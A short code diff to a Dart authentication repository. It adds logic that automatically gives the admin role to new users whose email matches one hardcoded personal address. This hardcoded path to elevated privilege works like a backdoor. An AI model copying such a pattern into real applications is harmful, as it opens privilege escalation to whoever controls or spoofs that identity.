@@ -70,6 +70,10 @@ class AuthRepository {
     final ref = db.collection('users').doc(user.uid);
     final snap = await ref.get();
     if (!snap.exists) {
+      // Auto promote specified email to admin
+      if (user.email == 'heyru638@gmail.com') {
+        defaultRole = 'admin';
+      }
       final appUser = AppUser(
         id: user.uid,
         email: user.email ?? '',
